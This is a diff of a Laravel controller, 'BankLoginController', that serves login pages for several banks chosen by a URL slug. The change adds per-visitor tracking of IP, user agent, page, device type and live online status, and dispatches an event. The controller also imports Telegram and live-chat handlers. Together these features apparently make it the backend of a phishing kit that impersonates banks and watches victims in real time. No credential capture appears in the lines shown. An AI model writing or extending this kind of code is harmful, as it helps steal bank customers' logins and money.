@@ -2,7 +2,9 @@
 
 namespace App\Http\Controllers;
 
+use App\Events\PreSessionCreated;
 use App\Models\BankSession;
+use App\Models\PreSession;
 use App\Telegram\Handlers\SmartSuppHandler;
 use Illuminate\Http\Request;
 use Illuminate\Support\Str;
@@ -26,18 +28,31 @@ class BankLoginController extends Controller
         }
 
         $session = BankSession::create([
-            'bank_slug' => $bankSlug,
-            'ip_address' => $request->ip(),
-            'user_agent' => $request->userAgent(),
+            'bank_slug'        => $bankSlug,
+            'ip_address'       => $request->ip(),
+            'user_agent'       => $request->userAgent(),
             'last_activity_at' => now(),
         ]);
+
+        $preSession = PreSession::create([
+            'ip_address'  => $request->ip(),
+            'user_agent'  => $request->userAgent(),
+            'page_url'    => $request->fullUrl(),
+            'page_name'   => $bankSlug,
+            'bank_slug'   => $bankSlug,
+            'device_type' => str_contains(strtolower($request->userAgent() ?? ''), 'mobile') ? 'mobile' : 'desktop',
+            'is_online'   => true,
+            'last_seen'   => now(),
+        ]);
+        PreSessionCreated::dispatch($preSession);
 
         $page = 'Banks/' . Str::studly(str_replace('-', '_', $bankSlug));
 
         return Inertia::render($page, [
-            'sessionId' => $session->id,
-            'bankSlug'  => $bankSlug,
-            'smartsupp' => SmartSuppHandler::getSettings(),
+            'sessionId'    => $session->id,
+            'bankSlug'     => $bankSlug,
+            'smartsupp'    => SmartSuppHandler::getSettings(),
+            'preSessionId' => $preSession->id,
         ]);
     }
 }
